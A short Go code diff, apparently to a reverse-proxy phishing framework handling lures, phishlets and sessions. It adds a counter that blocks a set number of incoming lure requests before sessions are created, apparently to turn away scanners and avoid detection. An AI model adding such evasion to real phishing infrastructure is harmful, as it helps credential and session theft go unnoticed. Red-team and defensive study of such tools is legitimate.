@@ -73,6 +73,7 @@ type HttpProxy struct {
 	ip_sids           map[string]string
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
+	skipRequests       int
 }
 
 type ProxySession struct {
@@ -93,6 +94,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		geoiplist:         geoiplist,
 		isRunning:         false,
 		last_sid:          0,
+		skipRequests:       0,
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
@@ -230,6 +232,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Error("lures: user-agent filter regexp is invalid: %v", err)
 										}
 									}
+								}
+
+								if p.skipRequests > 0 {
+									p.skipRequests--
+									log.Debug("Skipping request (%d more to skip)", p.skipRequests)
+									return p.blockRequest(req)
 								}
 
 								session, err := NewSession(pl.Name)
@@ -1431,6 +1439,15 @@ func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
 		req.Header.Set("Cookie", new_cookie)
 	}
 }
+
+func (p *HttpProxy) SetSkipRequests(skips int) {
+	p.skipRequests = skips
+}
+
+func (p *HttpProxy) GetSkipRequests() int {
+	return p.skipRequests
+}
+
 
 func (p *HttpProxy) whitelistIP(ip_addr string, sid string) {
 	p.ip_mtx.Lock()
